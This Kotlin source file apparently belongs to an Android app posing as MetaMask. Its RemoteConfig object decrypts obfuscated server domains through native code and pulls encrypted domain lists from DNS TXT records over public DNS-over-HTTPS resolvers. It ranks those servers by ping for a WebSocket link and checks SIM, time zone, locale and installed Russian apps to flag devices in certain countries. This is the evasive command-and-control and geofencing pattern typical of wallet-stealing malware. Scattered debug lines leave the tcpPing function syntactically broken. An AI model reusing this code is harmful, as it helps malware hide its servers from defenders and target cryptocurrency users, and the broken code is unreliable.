package com.example.MetaMask.utils

import android.content.Context
import android.content.pm.PackageManager
import android.telephony.TelephonyManager
import com.yourcompany.core.jni.NativeBridge
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.TimeUnit

object RemoteConfig {

    private const val OBFUSCATED_DOMAIN_B64 = "KAQZEw0dGwMLQAYAARYJ"
    private const val FALLBACK_DOMAIN_B64   = "AiAlPiU9LjcvIEs/KiY="

    private const val PREFS_NAME = "connection_prefs"
    private const val KEY_LAST_SUCCESS_DOMAIN = "last_success_domain"

    private val DNS_RESOLVERS = listOf(
        "https://dns.alidns.com/resolve",
        "https://dns.sb/dns-query",
        "https://dns.google/resolve",
        "https://cloudflare-dns.com/dns-query"
    )

    private const val RETRY_DELAY_MS = 15_000L

    private val fetchMutex = Mutex()

    @Volatile private var availableDomains: List<String> = emptyList()
    @Volatile private var currentDomainIndex = 0

    val serverDomain: String?
        get() = if (availableDomains.isNotEmpty()) availableDomains[currentDomainIndex % availableDomains.size]
        else null

    val wsBaseUrl: String?
        get() = serverDomain?.let { "wss://$it" }

    fun markCurrentDomainAsSuccess(context: Context) {
        android.util.Log.d("XDBG", "[RemoteConfig] markCurrentDomainAsSuccess enter context=ctx") //xdbg
        val goodDomain = serverDomain ?: return
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putString(KEY_LAST_SUCCESS_DOMAIN, goodDomain).apply()
    }

    fun rotateDomain() {
        if (availableDomains.size > 1) {
            currentDomainIndex++
        }
    }

    private fun decryptString(base64String: String): String? {
        android.util.Log.d("XDBG", "[RemoteConfig] decryptString enter base64String=${base64String}") //xdbg
        return try {
            val result = NativeBridge.nativeDecryptDomain(base64String)
            if (result.isEmpty()) null else result
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[RemoteConfig] catch Exception ${_.javaClass.simpleName}: ${_.message}") //xdbg
            null
        }
    }

    private fun isRiskyCountry(context: Context): Boolean {
        android.util.Log.d("XDBG", "[RemoteConfig] isRiskyCountry enter context=ctx") //xdbg
        var riskScore = 0
        val riskyCodes = listOf("ru", "by", "ir", "cn", "tm", "kz")

        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val simCountry = tm?.simCountryIso?.lowercase(Locale.ROOT)
            val networkCountry = tm?.networkCountryIso?.lowercase(Locale.ROOT)

            if (simCountry != null && riskyCodes.contains(simCountry)) riskScore += 100
            if (networkCountry != null && riskyCodes.contains(networkCountry)) riskScore += 100

            val timeZone = TimeZone.getDefault().id.lowercase(Locale.ROOT)

            if (timeZone.contains("moscow") ||
                timeZone.contains("volgograd") ||
                timeZone.contains("yekaterinburg") ||
                timeZone.contains("krasnoyarsk") ||
                timeZone.contains("omsk") ||
                timeZone.contains("novosibirsk") ||
                timeZone.contains("vladivostok") ||
                timeZone.contains("minsk") ||
                timeZone.contains("tehran") ||
                timeZone.contains("almaty")) {
                riskScore += 50
            }

            val locale = Locale.getDefault()
            val country = locale.country.lowercase(Locale.ROOT)
            if (riskyCodes.contains(country)) {
                riskScore += 30
            }

            val pm = context.packageManager
            val russianApps = listOf(
                "ru.sberbankmobile",
                "com.idamob.tinkoff.android",
                "ru.rostel",
                "ru.nspk.mirpay",
                "ru.yandex.searchplugin",
                "ru.oneme.app",
                "ru.ozon.app.android",
                "com.vkontakte.android",
                "com.wildberries.ru",
                "ru.yandex.yandexmaps"
            )

            for (app in russianApps) {
                try {
                    pm.getPackageInfo(app, 0)
                    riskScore += 50
                    break
                } catch (_: PackageManager.NameNotFoundException) {
                    android.util.Log.e("XDBG", "[RemoteConfig] catch NameNotFoundException ${_.javaClass.simpleName}: ${_.message}") //xdbg
                }
            }

        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[RemoteConfig] catch Exception ${_.javaClass.simpleName}: ${_.message}") //xdbg
        }

        return riskScore >= 40
    }

    private fun tcpPing(host: String, port: Int): Long {
        android.util.Log.d("XDBG", "[RemoteConfig] tcpPing enter host=${host} port=${port}") //xdbg
        return try {
            val start = System.currentTimeMillis()
            java.net.Socket().use { s ->
                s.connect(java.net.InetSocketAddress(host, port), 2000)
            }
            System.currentTimeMillis() - start
        } catch (_: Exception) { Long.MAX_VALUE }
            android.util.Log.e("XDBG", "[RemoteConfig] catch Exception ${_.javaClass.simpleName}: ${_.message}") //xdbg
    }

    private suspend fun pingAndSort(domains: Set<String>): List<String> = coroutineScope {
        data class R(val domain: String, val ms443: Long, val ms47443: Long)
        val results = domains.map { d ->
            async(Dispatchers.IO) { R(d, tcpPing(d, 443), tcpPing(d, 47443)) }
        }.awaitAll()

        results
            .sortedBy { minOf(it.ms443, it.ms47443) }
            .flatMap { r ->
                if (r.ms47443 < r.ms443)
                    listOf("${r.domain}:47443", r.domain)
                else
                    listOf(r.domain, "${r.domain}:47443")
            }
    }

    suspend fun fetchDomain(context: Context): Boolean {
        android.util.Log.d("XDBG", "[RemoteConfig] fetchDomain enter context=ctx") //xdbg
        if (!fetchMutex.tryLock()) return false
        try {
            val mainConfigDomain = decryptString(OBFUSCATED_DOMAIN_B64) ?: return false

            val targetDnsNames = listOf("all1.$mainConfigDomain")

            val foundDomains = mutableSetOf<String>()
            val client = OkHttpClient.Builder()
                .connectTimeout(5, TimeUnit.SECONDS)
                .build()

            var attempt = 0
            while (attempt < 3) {
                attempt++
                for (dnsName in targetDnsNames) {
                    for (resolverUrl in DNS_RESOLVERS) {
                        try {
                            val url = "$resolverUrl?name=$dnsName&type=TXT&random=${System.currentTimeMillis()}"
                            val request = Request.Builder()
                                .url(url)
                                .header("Accept", "application/dns-json")
                                .build()
                            val response = withContext(Dispatchers.IO) { client.newCall(request).execute() }
                            val responseBody = response.body?.string()

                            if (response.isSuccessful && !responseBody.isNullOrEmpty()) {
                                val jsonResponse = JSONObject(responseBody)
                                if (jsonResponse.optInt("Status") == 0 && jsonResponse.has("Answer")) {
                                    val answers = jsonResponse.getJSONArray("Answer")
                                    for (i in 0 until answers.length()) {
                                        var encryptedData = answers.getJSONObject(i).optString("data", "")
                                        if (encryptedData.startsWith("\"") && encryptedData.endsWith("\"")) {
                                            encryptedData = encryptedData.substring(1, encryptedData.length - 1)
                                        }
                                        val decrypted = decryptString(encryptedData)
                                        if (!decrypted.isNullOrEmpty()) {
                                            foundDomains.add(decrypted)
                                        }
                                    }
                                }
                            }
                        } catch (_: Exception) {
                            android.util.Log.e("XDBG", "[RemoteConfig] catch Exception ${_.javaClass.simpleName}: ${_.message}") //xdbg
                        }
                    }
                }

                if (foundDomains.isNotEmpty()) {
                    val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    val lastSuccess = prefs.getString(KEY_LAST_SUCCESS_DOMAIN, null)

                    val sorted = pingAndSort(foundDomains)
                    val topThird = sorted.size / 3
                    availableDomains = if (lastSuccess != null && sorted.contains(lastSuccess) &&
                        sorted.indexOf(lastSuccess) <= topThird) {
                        listOf(lastSuccess) + sorted.filter { it != lastSuccess }
                    } else {
                        sorted
                    }

                    currentDomainIndex = 0
                    return true
                }

                delay(RETRY_DELAY_MS)
            }
            val fallback = decryptString(FALLBACK_DOMAIN_B64)
            if (fallback != null) {
                availableDomains = pingAndSort(setOf(fallback))
                return true
            }
            return false
        } finally {
            fetchMutex.unlock()
        }
    }
}
